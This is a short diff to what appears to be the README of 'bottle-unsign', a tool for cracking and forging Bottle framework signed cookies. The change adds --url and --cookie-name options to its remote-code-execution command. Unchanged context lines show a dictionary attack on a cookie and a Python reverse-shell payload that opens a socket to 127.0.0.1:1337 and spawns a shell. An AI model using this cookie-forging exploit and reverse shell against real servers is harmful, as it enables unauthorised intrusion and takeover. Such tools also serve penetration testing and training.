@@ -60,7 +60,7 @@ bottle-unsign dict-attack --cookie '!wzE3YvpBN2Fixls6im4tdw==?gAWVFwAAAAAAAACMBG
 ```bash
 PAYLOAD='python3 -c "import os,pty,socket;s=socket.socket();s.connect((\"127.0.0.1\",1337));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")"'
 
-bottle-unsign rce --cookie "('name', {'name': RCE()})" --key your_secret --cmd $PAYLOAD
+bottle-unsign rce --cookie "('name', {'name': RCE()})" --key your_secret --cmd $PAYLOAD [--url] [--cookie-name]
 ```
 
 
